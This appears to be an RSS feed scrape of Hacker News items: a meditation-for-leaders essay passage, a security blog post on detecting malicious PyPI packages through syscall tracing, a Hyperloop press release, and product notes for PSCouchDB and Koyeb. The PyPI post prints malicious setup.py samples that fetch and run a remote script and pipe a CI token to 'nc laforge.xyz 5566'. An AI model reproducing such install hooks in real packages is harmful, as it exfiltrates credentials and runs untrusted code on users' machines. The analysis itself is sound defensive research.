<p>—<span>&nbsp;</span><em>mental calmness, composure, and evenness of temper, especially in a difficult situation</em></p>
<p>We notice things happening as we move throughout the world, but most of us don’t also notice the corresponding sensation in our body or thought in our mind. For every thing that happens in your external world, there is a corresponding internal marker, whether it be a body sensation, a thought or an emotion.</p>
<p>Whether conscious or not, most people spend most of their lives managing these sensations, thinking they’re operating within an external world. Two of the biggest triggers for people are change and uncertainty, which our mid- and post-COVID world has in spades. The world might trigger an emotion like dread (say your Controller says to you: “we need to talk”), which if unnoticed can literally color your entire reaction to the situation, and drive suboptimal outcomes that you look back on with regret.<span>&nbsp;</span><a href="http://ryanhvaughn.com/seeing-the-wave/" rel="noopener" target="_blank">Not that I know anything about that</a>.</p>
<p>Meditation gives us a space to see this mechanism in action. To literally watch the sensory nature of our world, and watch how those sensations trigger habitual reactions. To see dread for what it is: a mix of sensations, thoughts and emotions, none of which mean much at all despite their perceived intensity. And sitting still with our eyes closed, meditation offers the opportunity to practice experiencing these sensations without automatically reacting.&nbsp;</p>
<p>Through meditative practice, you develop your ability to experience thoughts/feelings/sensations as they are, without reacting to them, judging them, or needing to change or add to them.<span>&nbsp;</span><a href="http://ryanhvaughn.com/how-leaning-in-to-my-greatest-fear-enabled-me-to-make-better-decisions/" rel="noopener" target="_blank">So that in situations of intense emotion, instead of making a reflexive decision you regret, you develop your ability to pause, let the feeling happen, and then act.</a><span>&nbsp;</span>You develop the power to remain calm in crazy situations, not because you’re not feeling the craziness, but because you’ve trained in how to manage it.</p>
<div><p>In other words, you develop Equanimity.</p></div>
<h3><strong>Insight:</strong></h3>
<p>—<span>&nbsp;</span><em>direct, experiential understanding into the true nature of things</em></p>
<p>You probably think you know the true nature of things already—that you live in reality. If so, you’re wrong.</p>
<p>Not because Elon Musk is right and<span>&nbsp;</span><a href="https://www.space.com/41749-elon-musk-living-in-simulation-rogan-podcast.html" rel="noopener" target="_blank">we’re living in a computer simulation</a>, but because your mind has created innumerable virtual realities to help it navigate the world, and then mistakes those abstractions for the real thing.</p>
<p>This is helpful in many cases. For example, I can type many words per minute on this keyboard because my mind has created a mental model of how words translate to letters and then to finger strokes. I don’t have to interact with the actual complexity of the keyboard, the electricity that powers it and the connections to the black pixels appearing on the screen (reality), nor do I want to. It’s useful to live in the reality of simply words showing up on the screen while my hands go on autopilot. We do this type of abstraction to everything in our world, thereby isolating ourselves from reality in a bubble of abstractions, which we interact with as if they are actually real. Much of the time it’s a superpower, without which society as we know it would not be possible.</p>
<p>But this process of abstracting reality can also prevent us from seeing truths that are right in front of us, and actively inhibit us from making good decisions. Such as if we develop an abstract model of Bob from accounting as reliable and happy, and relate to him as such all the way until he blindsides us with his two week notice. As Mark Twain said, “What gets us into trouble is not what we don’t know. It’s what we know for sure that just ain’t so.”</p>
<p>Ray Dalio, billionaire hedge fund owner, author of the amazing book<span>&nbsp;</span><a href="https://www.amazon.com/Principles-Life-Work-Ray-Dalio/dp/1501124021" rel="noopener" target="_blank">Principles</a>, and possibly the most intentional decision maker in the world, agrees,<span>&nbsp;</span><a href="https://www.linkedin.com/posts/raydalio_principleoftheday-activity-6659100390421733377-0b0B" rel="noopener" target="_blank">adding</a>, “Most people make bad decisions because they’re so certain they’re right that they don’t allow themselves to see the better alternatives that exist.”</p>
<p>In other words, we interact with our mental models of reality as if they were real, and in doing so miss key aspects of a situation that, were we to see them, might change our perspective. Our version of reality has blind spots (if you’re still skeptical,<span>&nbsp;</span><a href="https://faculty.washington.edu/chudler/chvision.html" rel="noopener" target="_blank">try this experiment</a>).</p>
<p>Dalio (<a href="https://www.cnbc.com/2019/07/01/transcendental-meditation-helped-ray-dalio-recover-from-financial-ruin.html" rel="noopener" target="_blank">unsurprisingly an avowed meditator himself</a>) elaborates, calling out two key inhibitors to good decision making within our distorted version of reality: Ego and Blind Spots.<span>&nbsp;</span><a href="https://www.linkedin.com/posts/raydalio_principleoftheday-activity-6657359529312829440-ceHp" rel="noopener" target="_blank">Dalio said</a>, “The two biggest barriers to good decision making are your ego and your blind spots. Together, they make it difficult for you to objectively see what is true about you and your circumstances and to make the best possible decisions by getting the most out of others. If you can understand how the machine that is the human brain works, you can understand why these barriers exist and how to adjust your behavior to make yourself happier, more effective, and better at interacting with others.”</p>
<p>To maximize our potential as leaders, we must develop the ability to discern between useful abstractions like the keyboard, and harmful ones like our ego or beliefs based on faulty and unexamined premises. This skill requires first the humility to admit our perception of reality is fundamentally inaccurate at virtually all times (useful sometimes, yes, but still wrong), and second the willingness and ability to dissect our perception into its parts to determine what is actually true or useful, and what is not.</p>
<p><strong>Enter meditation.</strong></p>
<p>Through meditation we learn to understand reality on reality’s terms, seeing our biases, beliefs and other mental landmines in action. Seeing the mechanistic nature of our thoughts first hand while meditating has the affect of loosening our attachment to them, and giving us the choice to not respond or react. Meditation is a direct path to understanding how the machine that is the human brain works.</p>
<p>One of the early insights gained by meditators is that …</p></span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.purpose.jobs/blog/for-leaders-meditation-more-useful-than-business-school">https://www.purpose.jobs/blog/for-leaders-meditation-more-useful-than-business-school</a></em></p>]]>
            </description>
            <link>https://www.purpose.jobs/blog/for-leaders-meditation-more-useful-than-business-school</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070677</guid>
            <pubDate>Thu, 12 Nov 2020 15:10:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hunting for Malicious Packages on PyPI]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25070672">thread link</a>) | @jwcrux
<br/>
November 12, 2020 | https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/ | <a href="https://web.archive.org/web/*/https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
<article>

<section>
<p><img src="https://jordan-wright.com/blog/images/headers/svg/ossmalware.svg" alt="">
<br>
About a year ago, the Python Software Foundation <a href="https://discuss.python.org/t/what-methods-should-we-implement-to-detect-malicious-content/2240">opened a Request for Information (RFI)</a> to discuss how we could detect malicious packages being uploaded to PyPI. Whether it’s <a href="https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm">taking over abandoned packages</a>, <a href="https://github.com/dateutil/dateutil/issues/984">typosquatting on popular libraries</a>, or <a href="https://github.com/ChALkeR/notes/blob/master/Gathering-weak-npm-credentials.md">hijacking packages using credential stuffing</a>, it’s clear this is a real issue affecting nearly every package manager.</p>

<p>The truth is that package managers like PyPI are critical infrastructure that almost every company relies on. I could write for days on this topic, but I’ll just let this xkcd suffice for now.</p>
<p><a href="https://xkcd.com/2347/"><img src="https://imgs.xkcd.com/comics/dependency.png" alt="">
</a></p>
<p>This is an area of interest for me, so I responded with <a href="https://gist.github.com/jordan-wright/dfe6236cb4d084aba282239fa9679bc8">my thoughts</a> on how we could approach this. While the entire post is well-cited, beautiful prose that you should go read, one thing stuck with me: considering what happens as soon as a package is installed.</p>
<p>While it might be necessary for some setup activities, things like establishing network connections or executing commands during the <code>pip install</code> process should always be viewed with a 🤨, since it doesn’t give the developer much of a chance to inspect the code before bad things happen.</p>
<p>I wanted to explore this further, so in this post I’m going to walk through how I installed and analyzed every package in PyPI looking for malicious activity.</p>
<h2 id="how-to-find-malicious-libraries">How to Find Malicious Libraries</h2>
<p>To run arbitrary commands during installation, authors typically add code to the <code>setup.py</code> file in their package. You can see some examples in <a href="https://github.com/rsc-dev/pypi_malware/tree/master/malware">this repository</a>.</p>
<p>At a high-level, there are two things you can do to find potentially malicious dependencies: you can look through the code for bad things (static analysis), or you can live dangerously and just install them to see what happens (dynamic analysis).</p>
<p>While static analysis is super interesting (heck, I <a href="https://duo.com/decipher/hunting-malicious-npm-packages">found malicious packages on npm</a> using artisanal <code>grep</code>ing), for this post I’ll focus on dynamic analysis. After all, I think it’s a bit more robust since you’re looking at what <em>actually</em> happens instead of just looking for bad things that could happen.</p>
<p>So what is it we’re actually looking for?</p>
<h3 id="how-important-things-get-done">How Important Things Get Done</h3>
<p>Generally, anytime something important happens it’s done by the kernel. Normal programs (like <code>pip</code>) that want to do important things through the kernel do so through the use of <em>syscalls</em>. Opening files, establishing network connections, and executing commands are all done using syscalls!</p>
<p>You can find more information in this comic from <a href="https://twitter.com/b0rk">Julia Evans</a>:</p>
<blockquote><p lang="en" dir="ltr">system calls <a href="https://t.co/hL91dqbFyq">pic.twitter.com/hL91dqbFyq</a></p>— 🔎Julia Evans🔍 (@b0rk) <a href="https://twitter.com/b0rk/status/989011990092963840?ref_src=twsrc%5Etfw">April 25, 2018</a></blockquote>

<p>This means that if we can watch syscalls during the installation of a Python package, we can see if anything suspicious occurs. The benefit is that it doesn’t matter how obfuscated the code is- we’ll see what actually happens.</p>
<p>It’s important to note that the idea of watching syscalls isn’t something I came up with. Folks like <a href="https://twitter.com/adam_baldwin">Adam Baldwin</a> have been talking about this <a href="https://www.slideshare.net/evilpacket/hunting-for-malicious-modules-in-npm-nodesummit">since 2017</a>. And there was an <a href="https://arxiv.org/pdf/2002.01139.pdf">excellent paper</a> published by researchers from the Georgia Institute of Technology that took this same approach, among others. Honestly, most of this blog post is just trying to reproduce their work.</p>
<p>So we know we want to monitor syscalls - how exactly do we do that?</p>
<h3 id="watching-syscalls-with-sysdig">Watching Syscalls with Sysdig</h3>
<p>There are a number of tools designed to let you watch syscalls. For this project I used <a href="https://github.com/draios/sysdig">sysdig</a> since it provides both structured output and some really nice filtering capabilities.</p>
<p>To make this work, when starting the Docker container that installs the package, I also started a sysdig process that only monitors events from that container. I also filtered out network reads/writes that are going to/from <code>pypi.org</code> or <code>files.pythonhosted.com</code> since I didn’t want to fill the logs with traffic related to package downloads.</p>
<p>With a way to capture syscalls, I had to solve another problem: how to get a list of all PyPI packages.</p>
<h2 id="getting-python-packages">Getting Python Packages</h2>
<p>Fortunately for us, PyPI has an API called the <a href="https://www.python.org/dev/peps/pep-0503/">“Simple API”</a> that can also be thought of as “a very big HTML page with a link to every package” since that’s what it is. It’s simple, clean, and better than any HTML I can probably write.</p>
<p>We can grab this page and parse out all the links using <code>pup</code>, giving us right around 268,000 packages:</p>
<div><pre><code data-lang="text">❯ curl https://pypi.org/simple/ | pup 'a text{}' &gt; pypi_full.txt               

❯ wc -l pypi_full.txt 
  268038 pypi_full.txt</code></pre></div>
<p>For this experiment, I’ll only care about the latest release of each package. It’s possible that there’s malicious versions of packages buried in older releases, but the AWS bill isn’t going to pay itself.</p>
<p>I ended up with a pipeline that looked something like this:</p>

<p>In a nutshell, we’re sending each package name to a set of EC2 instances (I’d love to use Fargate or something in the future but I also don’t know Fargate, so…) which fetches some metadata about the package from PyPI, then starts sysdig as well as a series of containers to <code>pip install</code> the package while syscalls and network traffic were being collected. Then, all of the data is shipped up to S3 for future-Jordan to worry about.</p>
<p>Here’s what this process looks like:</p>

<h2 id="the-results">The Results</h2>
<p>Once this was complete, I had about a terabyte of data sitting in an S3 bucket covering around 245,000 packages. A few packages didn’t have a published version, and some had various processing errors but this felt like a great sample set to work from.</p>
<p>Now for the fun part: <strike>a crapton of grep</strike> ✨ <strong>analysis</strong> ✨.</p>
<p>I merged the metadata and the output, giving me a series of JSON files that looked like this:</p>
<div><pre><code data-lang="json"><span>{</span>
    <span>"metadata"</span><span>:</span> <span>{},</span>
    <span>"output"</span><span>:</span> <span>{</span>
        <span>"dns"</span><span>:</span> <span>[],</span>         <span>//</span> <span>Any</span> <span>DNS</span> <span>requests</span> <span>made</span>
        <span>"files"</span><span>:</span> <span>[],</span>       <span>//</span> <span>All</span> <span>file</span> <span>access</span> <span>operations</span>
        <span>"connections"</span><span>:</span> <span>[],</span> <span>//</span> <span>TCP</span> <span>connections</span> <span>established</span>
        <span>"commands"</span><span>:</span> <span>[],</span>    <span>//</span> <span>Any</span> <span>commands</span> <span>executed</span>
    <span>}</span>
<span>}</span></code></pre></div>
<p>I then wrote a series of scripts to start aggregating the data, trying to get a sense of what’s benign and what’s malicious. Let’s dig into some of the results.</p>
<h3 id="network-requests">Network Requests</h3>
<p>There are a number of reasons why a package would need to make a network connection during the installation process. They might need to download legitimate binary components or other resources, they might be a form of analytics, or they may be trying to exfiltrate data or credentials from the system.</p>
<p>The results found 460 packages making network connections to 109 unique hosts. Just like the paper above mentions, quite a few of these are the result of packages sharing a dependency that makes the network connection. It’s possible to filter these out by mapping dependencies, but I haven’t done that here.</p>
<p>For more information, <a href="https://gist.github.com/jordan-wright/c8b273372368ee639dec46b08a93bce1">here’s</a> a breakdown of DNS requests seen during installation.</p>
<h3 id="command-execution">Command Execution</h3>
<p>Like network connections, there are legitimate reasons for packages to run system commands during installation. This could be to compile native binaries, setup the right environment, and more.</p>
<p>Looking across our sample set, 60,725 packages are found to be executing commands during installation. And just like network connections, we have to keep in mind that many of these will be the result of a downstream dependency being the package that runs the commands.</p>
<h2 id="interesting-packages">Interesting Packages</h2>
<p>Digging into the results, most network connections and commands appeared to be legitimate, as expected. But there were a few instances of odd behavior I wanted to call out as case studies to show how useful this type of analysis can be.</p>
<h3 id="i-am-malicious"><code>i-am-malicious</code></h3>
<p>One package called <code>i-am-malicious</code> appears to be a proof-of-concept of a malicious package. Here are the interesting details that give us an idea that the package is worth investigating (if the name weren’t enough 😉):</p>
<div><pre><code data-lang="json"><span>{</span>
  <span>"dns"</span><span>:</span> <span>[{</span>
          <span>"name"</span><span>:</span> <span>"gist.githubusercontent.com"</span><span>,</span>
          <span>"addresses"</span><span>:</span> <span>[</span>
            <span>"199.232.64.133"</span>
          <span>]</span>
    <span>}]</span>
  <span>]</span><span>,</span>
  <span>"files"</span><span>:</span> <span>[</span>
    <span>...</span>
    <span>{</span>
      <span>"filename"</span><span>:</span> <span>"/tmp/malicious.py"</span><span>,</span>
      <span>"flag"</span><span>:</span> <span>"O_RDONLY|O_CLOEXEC"</span>
    <span>},</span>
    <span>...</span>
    <span>{</span>
      <span>"filename"</span><span>:</span> <span>"/tmp/malicious-was-here"</span><span>,</span>
      <span>"flag"</span><span>:</span> <span>"O_TRUNC|O_CREAT|O_WRONLY|O_CLOEXEC"</span>
    <span>},</span>
    <span>...</span>
  <span>],</span>
  <span>"commands"</span><span>:</span> <span>[</span>
    <span>"python /tmp/malicious.py"</span>
  <span>]</span>
<span>}</span></code></pre></div>
<p>We can already get some sense of what’s happening here. We see a connection made to <code>gist.github.com</code>, a Python file being executed, and a file named <code>/tmp/malicious-was-here</code> being created. Sure enough, that’s exactly what’s happening in the <code>setup.py</code>:</p>
<div><pre><code data-lang="python"><span>from</span> <span>urllib.request</span> <span>import</span> <span>urlopen</span>

<span>handler</span> <span>=</span> <span>urlopen</span><span>(</span><span>"https://gist.githubusercontent.com/moser/49e6c40421a9c16a114bed73c51d899d/raw/fcdff7e08f5234a726865bb3e02a3cc473cecda7/malicious.py"</span><span>)</span>
<span>with</span> <span>open</span><span>(</span><span>"/tmp/malicious.py"</span><span>,</span> <span>"wb"</span><span>)</span> <span>as</span> <span>fp</span><span>:</span>
    <span>fp</span><span>.</span><span>write</span><span>(</span><span>handler</span><span>.</span><span>read</span><span>())</span>

<span>import</span> <span>subprocess</span>

<span>subprocess</span><span>.</span><span>call</span><span>([</span><span>"python"</span><span>,</span> <span>"/tmp/malicious.py"</span><span>])</span></code></pre></div>
<p>The <a href="https://gist.githubusercontent.com/moser/49e6c40421a9c16a114bed73c51d899d/raw/fcdff7e08f5234a726865bb3e02a3cc473cecda7/malicious.py"><code>malicious.py</code></a> in question simply adds an “I was here” type message to <code>/tmp/malicious-was-here</code>, suggesting this is indeed a proof-of concept.</p>
<h3 id="maliciouspackage"><code>maliciouspackage</code></h3>
<p>Another self-proclaimed malicious package creatively named <code>maliciouspackage</code> is a bit more nefarious. Here’s the relevant output:</p>
<div><pre><code data-lang="json"><span>{</span>
  <span>"dns"</span><span>:</span> <span>[{</span>
      <span>"name"</span><span>:</span> <span>"laforge.xyz"</span><span>,</span>
      <span>"addresses"</span><span>:</span> <span>[</span>
        <span>"34.82.112.63"</span>
      <span>]</span>
  <span>}],</span>
  <span>"files"</span><span>:</span> <span>[</span>
    <span>{</span>
      <span>"filename"</span><span>:</span> <span>"/app/.git/config"</span><span>,</span>
      <span>"flag"</span><span>:</span> <span>"O_RDONLY"</span>
    <span>},</span>
  <span>],</span>
  <span>"commands"</span><span>:</span> <span>[</span>
    <span>"sh -c apt install -y socat"</span><span>,</span>
    <span>"sh -c grep ci-token /app/.git/config | nc laforge.xyz 5566"</span><span>,</span>
    <span>"grep ci-token /app/.git/config"</span><span>,</span>
    <span>"nc laforge.xyz 5566"</span>
  <span>]</span>
<span>}</span></code></pre></div>
<p>As before, our output gives us a decent idea of what’s going on. In this case, the package appears to extract out a token from the <code>.git/config</code> file and upload it to <code>laforge.xyz</code>. Looking through the <code>setup.py</code>, we see that’s exactly what’s happening:</p>
<div><pre><code data-lang="python"><span>...</span>
<span>import</span> <span>os</span>
<span>os</span><span>.</span><span>system</span><span>(</span><span>'apt install -y socat'</span><span>)</span>
<span>os</span><span>.</span><span>system</span><span>(</span><span>'grep ci-token /app/.git/config | nc laforge.xyz 5566'</span><span>)</span></code></pre></div>
<h3 id="easyioctl"><code>easyIoCtl</code></h3>
<p>The package <code>easyIoCtl</code> is an interesting one. It claims to give “abstractions away from boring IO operations” but we see the following commands being executed:</p>
<div><pre><code data-lang="bash"><span>[</span>
  <span>"sh -c touch /tmp/testing123"</span>,
  <span>"touch /tmp/testing123"</span>
<span>]</span></code></pre></div>
<p>Suspicious, but not actively harmful. However, this is a <em>perfect</em> example showing the power of tracing syscalls. Here is the relevant code in …</p></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/">https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/</a></em></p>]]>
            </description>
            <link>https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070672</guid>
            <pubDate>Thu, 12 Nov 2020 15:10:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[First Passengers Travel Safely on a Hyperloop]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25070618">thread link</a>) | @hliyan
<br/>
November 12, 2020 | https://virginhyperloop.com/press/first-passenger-testing | <a href="https://web.archive.org/web/*/https://virginhyperloop.com/press/first-passenger-testing">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

										
					<div><ul><br>
<li>Josh Giegel, CTO and Co-Founder, and Sara Luchian, Director of Passenger Experience, ride the first new form of transportation in over a century</li><br>
</ul>
<p>LAS VEGAS, NEVADA – November 8, 2020 – Transportation history was made today in the Nevada desert, where Virgin Hyperloop tested human travel in a hyperloop pod for the first time. </p>
<p>“For the past few years, the Virgin Hyperloop team has been working on turning its ground breaking technology into reality,” said <strong>Sir Richard Branson, Founder of the Virgin Group</strong>. “With today’s successful test, we have shown that this spirit of innovation will in fact change the way people everywhere live, work, and travel in the years to come.”</p>
<p>Josh Giegel, Co-Founder and Chief Technology Officer, and Sara Luchian, Director of Passenger Experience, were the first people in the world to ride on this new form of transportation. The test took place at Virgin Hyperloop’s 500 meter DevLoop test site in Las Vegas, where the company has previously run over 400 un-occupied tests. </p>
<p>“When we started in a garage over 6 years ago, the goal was simple – to transform the way people move,” said <strong>Josh Giegel, Co-Founder and Chief Technology Officer of Virgin Hyperloop</strong>. “Today, we took one giant leap toward that ultimate dream, not only for me, but for all of us who are looking towards a moonshot right here on Earth.”</p>
<p>The occupants made their maiden voyage on the newly-unveiled XP-2 vehicle, designed by BIG – <a href="https://big.dk/">Bjarke Ingels Group</a> and <a href="https://kilodesign.dk/">Kilo Design</a>, which was custom-built with occupant safety and comfort in mind. While the production vehicle will be larger and seat up to 28 passengers, this 2-seater XP-2 vehicle was built to demonstrate that passengers can in fact safely travel in a hyperloop vehicle. </p>
<p>“Hyperloop is about so much more than the technology. It’s about what it enables,” said <strong>Sara Luchian, Director of Passenger Experience for Virgin Hyperloop</strong>. “To me, the passenger experience ties it all together. And what better way to design the future than to actually experience it first-hand?”</p>
<p>Sultan Ahmed Bin Sulayem, Chairman of Virgin Hyperloop, watched this historic passenger testing first-hand. </p>
<p>“I had the true pleasure of seeing history made before my very eyes – to witness the first new mode of mass transportation in over 100 years come to life,” said <strong>Sultan Ahmed Bin Sulayem, Chairman of Virgin Hyperloop and Group Chairman and CEO of DP World</strong>. “I have always had tremendous faith in the team at Virgin Hyperloop to transform this technology into a safe system, and today we have done that. We are one step closer to ushering in a new era of ultra-fast, sustainable movement of people and goods.”</p>
<p>The testing campaign, from the beginning stages all the way through to today’s successful demonstration, was overseen by the industry-recognized Independent Safety Assessor (ISA) <a href="https://www.certifer.fr/en/homepage">Certifer</a>. Having undergone a rigorous and exhaustive safety process, the XP-2 vehicle demonstrates many of the safety-critical systems that will be found on a commercial hyperloop system and is equipped with a state-of-the-art control system that can detect off-nominal states and rapidly trigger appropriate emergency responses.</p>
<p>“I can’t tell you how often I get asked ‘is hyperloop safe?,’” said <strong>Jay Walder, CEO of Virgin Hyperloop</strong>. “With today’s passenger testing, we have successfully answered this question, demonstrating that not only can Virgin Hyperloop safely put a person in a pod in a vacuum environment, but that the company has a thoughtful approach to safety which has been validated by an independent third party.” </p>
<p>This announcement builds off of significant momentum on the regulatory front. Just last month, Virgin Hyperloop <a href="https://virginhyperloop.com/press/west-virginia-hcc">unveiled West Virginia as the location for the Hyperloop Certification Center (HCC)</a>. In July 2020, the US Department of Transportation (USDOT) Secretary Elaine Chao and the Non-Traditional and Emerging Transportation Technology (NETT) Council unveiled the <a href="https://virginhyperloop.com/press/guidance-document-regulation">guidance document</a> on a clear regulatory framework for hyperloop in the United States. This historic announcement not only provides a pathway for hyperloop regulation and deployment in the US, but also establishes hyperloop’s eligibility for federal funding for projects.</p>
<p>This federal momentum, combined with the advancements at the HCC and the historic safety demonstration achieved with this test will pave the way for the certification of hyperloop systems around the world – a key step towards commercial projects.</p><br>
<h3>Media Assets</h3>
<p>Media assets can be found <a href="https://www.dropbox.com/sh/nm689gycztpn66n/AADgE6pJQeJtXcd6225sSulDa?dl=0">here</a>. Please credit Virgin Hyperloop.</p><br>


												<h2>About Virgin Hyperloop</h2>
<p>Virgin Hyperloop is the only company in the world that has successfully tested hyperloop technology at scale, launching the first new mode of mass transportation in over 100 years. The company successfully operated a full-scale hyperloop vehicle using electric propulsion and electromagnetic levitation under near-vacuum conditions, realizing a fundamentally new form of transportation that is faster, safer, cheaper, and more sustainable than existing modes. The company is now working with governments, partners, and investors around the world to make hyperloop a reality in years, not decades. Learn more about Virgin Hyperloop's technology, vision, and ongoing projects <a href="https://virginhyperloop.com/">here</a>.</p><br>


							
							
							<h2>Media Contacts</h2>
<p><strong>Virgin Hyperloop</strong> <br>
Ryan Kelly <br>
Vice President of Marketing and Communications <br>
press@virginhyperloop.com<br>
+1 (610) 442-1896</p><br>


							
													
					</div>
				</div></div>]]>
            </description>
            <link>https://virginhyperloop.com/press/first-passenger-testing</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070618</guid>
            <pubDate>Thu, 12 Nov 2020 15:06:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advanced CLI for CouchDB Server]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25070521">thread link</a>) | @johnjackjames
<br/>
November 12, 2020 | https://pscouchdb.readthedocs.io/en/latest/ | <a href="https://web.archive.org/web/*/https://pscouchdb.readthedocs.io/en/latest/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Note</p>
<p>If you are using CouchDB version 2, use the PSCouchDB 1.X version; if instead you are using CouchDB version 3 or 4, use the PSCouchDB version 2.X</p>
</div></div>]]>
            </description>
            <link>https://pscouchdb.readthedocs.io/en/latest/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070521</guid>
            <pubDate>Thu, 12 Nov 2020 14:57:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Koyeb Serverless Engine: Docker Containers, Continuous Deployment of Functions]]>
            </title>
            <description>
<![CDATA[
Score 47 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25070416">thread link</a>) | @edouardb
<br/>
November 12, 2020 | http://koyeb.com/blog/announcing-the-koyeb-serverless-engine-docker-containers-and-continuous-deployment-of-functions | <a href="https://web.archive.org/web/*/http://koyeb.com/blog/announcing-the-koyeb-serverless-engine-docker-containers-and-continuous-deployment-of-functions">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>In July, we announced the early access of the Koyeb platform to help developers and businesses run serverless data-processing apps in minutes. Since then, we have received a lot of feedback and have been at work improving the product.</p><p>Today, we are proud to announce the public availability of the <strong>Koyeb Serverless Engine</strong> with our latest features to <strong>deploy your own code</strong>. In addition to the ready-to-use integrations, you can now seamlessly deploy <strong><a href="#native-support-of-docker-containers">Docker Containers</a></strong> and <strong><a href="#continuous-deployment-of-python-and-nodejs-functions-using-git">Code Functions with built-in Continuous Deployment using Git</a>.</strong></p><p>This release brings the power of the Koyeb Serverless Engine to all developers and businesses with <strong><a href="#event-driven-processing">event-driven processing</a>, <a href="#serverless-autoscaling-and-high-availability">native autoscaling</a>,</strong> and <strong>a complete secret management engine.</strong> The Koyeb platform provides strong primitives for data-processing with our <strong><a href="#object-storage-api-and-data-processing">Universal S3-Compliant Object Storage API</a></strong> and <strong>ready-to-use integrations</strong>. We're also happy to share that <strong><a href="#new-open-source-catalog">our catalog is now open-source</a></strong>.</p><p>The Koyeb platform offers an efficient solution to deploy your serverless applications. It is the best platform to <strong>deploy short and long-running background processing tasks with no time limit for the execution of your jobs</strong>. Common use-cases are:</p><ul><li><em>Media processing</em>: transforming images, videos, audio recordings or PDFs directly at upload</li><li><em>Web scraping and headless browser requests</em>: fetching data from and interacting with websites which do not have any API</li><li><em>Interfacing with slow or asynchronous APIs</em>: calling slow APIs or APIs using callbacks</li><li><em>Asynchronous Computer Vision and Inference</em>: automatic content detection in photos and videos for indexing, metadata enrichment or advanced anlysis</li><li><em>Batch processing</em>: running heavy computations on batches of database records or media</li><li><em>Data science and report generation</em>: analysing data and generating pre-computed reports</li><li><em>Notification reception and processing from IoT devices</em>: reacting to events generated by devices and triggering actions</li><li><em>DevOps</em>: backup, monitoring, build and deployment jobs</li><li>And much more!</li></ul><p><strong>We're happy to provide 1000 hours of compute, 1TB of storage, and 5TB of bandwidth per month for free until the end of the year.</strong>  All the function executions are currently powered by <strong>1GB of RAM and 1 vCPU</strong>. <a target="_blank" rel="noopener" href="https://app.koyeb.com/auth/signup"><strong>Sign up now</strong></a> and start deploying serverless functions!</p><p>One of the recurring requests we got was the ability to <strong>deploy your own code on Koyeb</strong>. We get it: you need to be able to inject your business logic and pair it with our ready-to-use integrations to build your application faster and better.</p><p>When looking for an efficient way to let you manage your stack functions and modifications, we decided to go with the best-practice for code and infrastructure management: <strong>version everything</strong>. We're glad to share that this new release brings a <strong>native integration with git and GitHub</strong> to seamlessly integrate Koyeb with your development workflows.</p><p>Integrating Koyeb in your development environment is a two-step process:</p><ol start="1"><li>Add a <span><code><span>koyeb.yaml</span></code></span> file in your repository describing your stack configuration. Stacks can now be deployed with a simple YAML syntax which should look familiar.
For instance, to deploy a Python 3.8 function with the <span><code><span>handler</span></code></span> entrypoint in the <span><code><span>hello_world</span></code></span> package, your <span><code><span>koyeb.yaml</span></code></span> will look like:</li></ol><pre><code><span>1</span><span>functions:
</span><span>2</span>  - name: hello-world
<span>3</span>    runtime: python3.8
<span>4</span>    handler: hello_world.handler
</code></pre><p>Fork our <a target="_blank" rel="noopener" href="https://github.com/koyeb-community/hello-world-python">Hello World in Python on GitHub</a> to see a simple example in action. You can deploy Python and Node.js functions with the same syntax.</p><ol start="2"><li>Connect your GitHub repository to Koyeb.</li></ol><p>Now each time you <span><code><span>git push</span></code></span>, we will build and deploy your code!</p><p>For Python and Node.js functions, we take care of the complete build process using standard dependency management tools. If you want to read more about deploying code functions, check our <a target="_blank" rel="noopener" href="http://koyeb.com/docs/stacks/quickstart/deploy-python-function">Python function</a> and <a target="_blank" rel="noopener" href="http://koyeb.com/docs/stacks/quickstart/deploy-nodejs-function">Node.js function</a> documentation.</p><p>After looking into the serverless space, we found that serverless solutions were fragmented into two separate generations of products to solve the same problem: containers and code functions. Our research shows that a lot of developers and companies try to use code functions but end up migrating to a container service due to runtime limitations.</p><p>We want you to be able to process your data with the technology you know and love, so we decided to provide <strong>a unified solution to deploy your applications</strong>.</p><p><strong>Containers can be deployed with the same simple YAML syntax as functions.</strong>
For instance, to deploy the <span><code><span>koyeb/cowsay</span></code></span> container from the Docker Hub, you simply need three lines of configuration:</p><pre><code><span>1</span><span>functions:
</span><span>2</span>  - name: hello-koyeb
<span>3</span>    image: koyeb/cowsay
